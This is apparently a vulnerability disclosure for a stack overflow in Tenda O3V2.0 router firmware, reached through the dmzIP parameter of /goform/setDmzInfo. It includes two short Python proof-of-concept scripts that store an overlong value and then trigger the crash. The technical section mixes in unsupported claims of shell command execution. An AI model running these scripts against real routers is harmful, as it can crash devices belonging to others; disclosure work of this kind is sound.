## Summary

A stack overflow vulnerability exists in the Tenda O3V2.0 V1.0.0.10(2478) firmware. The `dmzIP` POST parameter accepted by `/goform/setDmzInfo` is written to the configuration key `wan1.dmzip` or `wan5.dmzip`  via `SetValue` without length or content validation. The stored value is later read (via `/goform/getDmzInfo`) and stored on the stack. Since there is no limit on the length of the stored value, it can lead to stack overflow.

## Affected product & versions

- **Vendor:** Tenda
- **Product:** O3V2.0 (firmware)
- **Affected version:** V1.0.0.10(2478)
- **Download:** https://www.tenda.com.cn/download/detail-2832.html

## Vulnerability type

- **Type**:Stack overflow
- **Root cause:** Missing input validation / insufficient sanitization and lack of length checks in `SetValue` and `GetValue` functions that handle`wan1.dmzip` or `wan5.dmzip`.

## Technical details

- The `setDmzInfo` endpoint accepts a POST parameter `dmzIP` and calls `SetValue("wan1.dmzip", V7)` or ` SetValue("wan5.dmzip", V7)` without enforcing a maximum length or sanitizing shell metacharacters.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_121650.png)

- The `getDmzInfo` endpoint reads `dmzIP` via `GetValue("wan1.dmzip", v11)` or `GetValue("wan5.dmzip", v11)` and passes it into a shell-invoking context (or a system call) without sanitization, making stored payloads executed when the endpoint is processed.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_121458.png)

Both `SetValue` and `GetValue` lack proper validation of the value contents and length.

## Proof of Concept

1. **Store a malicious `wan1.dmzip` or `wan5.dmzip` value**

```python
# poc_set.py
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/setDmzInfo"
payload =  b"a"*1000

data = {"dmzIP":payload}
response = requests.post(url, data=data)
print(response.text)
```

2. **Trigger the vulnerable behavior**

```python
# poc_get.py
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/getDmzInfo"
response = requests.post(url)
print(response.text)
```

3. **Attack result**

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_104719.png)

